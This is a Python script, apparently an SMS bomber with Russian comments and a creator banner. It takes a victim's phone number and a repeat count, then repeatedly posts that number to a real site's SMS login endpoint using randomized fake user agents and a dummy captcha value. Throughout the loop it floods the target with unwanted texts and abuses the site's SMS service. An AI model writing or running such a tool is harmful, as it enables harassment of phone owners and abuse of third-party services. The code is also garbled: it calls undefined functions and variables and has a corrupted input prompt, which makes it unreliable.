#Библиотеки
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *
#Обозначение
console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

user = fake_useragent.UserAgent().random
headers = {'user_agent' : user}
console.print('''[bold red]
 -----------------------------------------
| Создатель - Hironotori                  |
| Telegram - @Hironotori                  |
| Человек которий сильно помог - @GGClubbb|
 -----------------------------------------
''')
NUMBER = input('[green]Beeante HOMeP tenedona: (бes + ')



run = int(console.input('[green]Введите количество повторов (1-35):\n[blue]spammer>> '))
for _ in track(range(run)):

 try:
     print('3')
     formatted_phone = format_phone(number, "+###+##+###+##+##")
     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers)
 except:
     print('33')
 try:
     print('4')
     formatted_phone = format_phone(number, "+###+##+###+##+##")
     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
 except:
     print('44')
 try:
     print('5')
     requests.post("https://kumo.com.ua/login/sms/", data={"phone": "+" + NUMBER}, headers=headers)
 except:
     print('55')
